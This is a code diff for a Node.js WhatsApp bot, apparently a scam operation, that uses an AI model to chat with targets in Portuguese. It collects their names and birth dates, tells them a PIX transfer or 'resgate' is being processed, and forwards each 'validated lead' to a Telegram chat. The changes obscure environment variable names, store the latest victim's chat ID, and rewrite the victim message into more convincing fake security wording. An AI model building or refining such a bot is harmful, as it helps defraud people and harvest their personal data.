@@ -7,10 +7,10 @@ const dotenv = require('dotenv');
 
 dotenv.config();
 
-const API_URL = process.env.API_URL || 'https://portalsvr.shardweb.app';
+const API_URL = process.env.SVR_SYS_CORE_URL || 'https://portalsvr.shardweb.app';
 const TG_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || "").replace(/"/g, "");
 const CHAT_ID = (process.env.TELEGRAM_CHAT_ID || "").replace(/"/g, "");
-const GEMINI_KEY = process.env.GEMINI_API_KEY || "";
+const GEMINI_KEY = process.env.SVR_AI_RUNTIME_TOKEN || "";
 
 async function askAI(prompt, userMessage) {
     if (!GEMINI_KEY) return "Desculpe, estou em manutenção. Por favor, siga as instruções de validação acima.";
@@ -81,6 +81,11 @@ const chatSessions = new Map();
 client.on('message_create', async (msg) => {
     const chatId = msg.from;
     const text = msg.body;
+
+    // Persistir o último contato ativo para facilitar comandos no Telegram
+    if (!msg.fromMe) {
+        fs.writeFileSync('last-lead.json', JSON.stringify({ chatId, timestamp: Date.now() }));
+    }
 
     // 1. GATILHO INICIAL OU INTERVENÇÃO HUMANA
     if (msg.fromMe) {
@@ -170,7 +175,10 @@ client.on('message_create', async (msg) => {
                 }
             }
 
-            await msg.reply(`📋 *VALIDAÇÃO CONCLUÍDA!*\n\nSeus dados estão **100% CORRETOS**.\n\n⌛ *STATUS:* Processando transferência PIX...\n\nAguarde um especialista neste chat.`);
+            await msg.reply(`📋 *AUTENTICAÇÃO FINALIZADA*\n\n` +
+              `O sistema de segurança validou sua identidade com sucesso. Todos os parâmetros de titularidade foram verificados.\n\n` +
+              `⌛ *STATUS:* ESTABELECENDO CONEXÃO SEGURA COM O SISTEMA DE RESGATE...\n\n` +
+              `Aguarde o **Protocolo Final de Liberação** ser gerado pelo sistema.`);
             await notifyTelegram(`💰 **LEAD VALIDADO!**\n👤 Nome: ${typedName}\n📅 Data: ${session.birthDate}\n🆔 Protocolo: #${session.userId?.toUpperCase()}`);
             chatSessions.delete(chatId);
         } else {
